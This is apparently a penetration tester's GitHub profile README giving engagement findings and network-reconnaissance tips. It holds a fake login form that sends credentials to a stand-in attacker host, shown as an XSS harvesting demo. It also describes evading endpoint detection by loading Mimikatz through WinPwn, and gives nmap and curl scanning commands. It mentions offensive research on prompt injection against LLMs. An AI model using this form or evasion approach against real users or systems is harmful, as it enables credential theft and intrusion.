<svg width="1000" height="220" viewBox="0 0 1000 220" xmlns="http://www.w3.org/2000/svg">
  <defs>
    <pattern id="paperlines" width="4" height="4" patternUnits="userSpaceOnUse">
      <rect width="4" height="4" fill="#e9e6db"/>
      <line x1="0" y1="0" x2="4" y2="0" stroke="#00000008" stroke-width="1"/>
    </pattern>
  </defs>

  <rect width="1000" height="220" fill="url(#paperlines)"/>

  <rect x="0" y="0" width="1000" height="28" fill="#171613"/>
  <text x="500" y="19" text-anchor="middle" font-family="Courier New, monospace" font-size="11"
        letter-spacing="3" fill="#e9e6db">FOR PROFESSIONAL REVIEW &#8212; UNCLASSIFIED SUMMARY</text>

  <line x1="40" y1="188" x2="960" y2="188" stroke="#1b1b18" stroke-width="3"/>
  <line x1="40" y1="192" x2="960" y2="192" stroke="#1b1b18" stroke-width="1"/>

  <text x="40" y="70" font-family="Courier New, monospace" font-size="12" letter-spacing="1" fill="#4a4844">FILE REF: GITHUB / SEC-OPS / REV. 2026</text>

  <text x="40" y="118" font-family="Courier New, monospace" font-size="46" font-weight="700" letter-spacing="1" fill="#1b1b18">Mark Snyder</text>

  <text x="40" y="150" font-family="Helvetica, Arial, sans-serif" font-size="17" fill="#4a4844">Senior Penetration Tester &#183; Web &#183; API &#183; Network</text>

  <g transform="translate(760,120) rotate(-4)">
    <rect x="0" y="0" width="190" height="34" fill="none" stroke="#a8382c" stroke-width="2.5" rx="3"/>
    <text x="95" y="22" text-anchor="middle" font-family="Courier New, monospace" font-size="13" font-weight="700"
          letter-spacing="2" fill="#a8382c">ACTIVE SECRET CLEARANCE</text>
  </g>
</svg>

## Currently

- 🎯 Preparing for the **OSCP** (expected Dec 2026)
- 🤖 Building small AI agent tooling — experimenting with tool/function calling and exploring how LLM-assisted workflows fit into a pentest methodology.
- 🔍 Digging into **LLM security** — prompt injection and system-prompt leakage on the offensive side, alongside sanitization practices for safely feeding engagement data into AI tools
<br>


## Selected Findings

### XSS → Credential Harvesting Demo

I found a reflected XSS vulnerability on an anonymously-accessible endpoint and was asked to demonstrate real-world impact. Since there was no login session to hijack, I used HTML injection to render a spoofed login form in its place — showing the client how easily user credentials could be harvested. I also walked a teammate through the approach as a quick knowledge-share.


```html
<form action="https://attacker-controlled.example/collect" method="POST">
  <input type="text" name="username" placeholder="Username" required>
  <input type="password" name="password" placeholder="Password" required>
  <button type="submit">Sign In</button>
</form>
```



<br>


### Mimikatz Execution on a Hardened Endpoint via WinPwn

I was provided a well-hardened endpoint to test.  Direct Mimikatz execution was reliably blocked, even after trying several AMSI-bypass techniques (including a number from [Amsi-Bypass-Powershell](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell), which — unsurprisingly — were already well signatured). I pivoted to [WinPwn](https://github.com/S3cur3Th1sSh1t/WinPwn), a broader enumeration and exploitation toolkit, which loads Mimikatz indirectly rather than invoking it directly. That indirection was enough to slip past the endpoint's detection and get it running.

**Takeaway:** Direct signature-based blocks on known tools like Mimikatz don't always account for tools that load them as a dependency rather than invoking them by name — a useful reminder when evaluating EDR coverage.
<br><br>
## Tips

### Enumerate Web Sites via SSL Certificate

When scanning a network range, the `commonName` field in SSL certs often reveals hostnames that wouldn't otherwise surface in a basic port scan — useful for building out a target list quickly.

```bash
nmap -Pn -p 443 --script ssl-cert 10.0.0.250-253 | grep -e "commonName"
```

### Getting a Large Number of Web Sites into Burp

For quickly funneling a whole subnet's worth of web servers into Burp's site map without manually browsing to each one:

1. Scan the network for common web ports and output in greppable format:
```bash
   nmap -p 80,443 10.0.0.0/24 -oG net.scan
```
2. Open Burp and have it listening for incoming proxy traffic.
3. Loop through the discovered hosts, routing each request through the Burp proxy:
```bash
   for i in $(grep '/open/' net.scan | awk '{print $2}'); do
     curl -sk --proxy localhost:8080 https://$i
   done
```




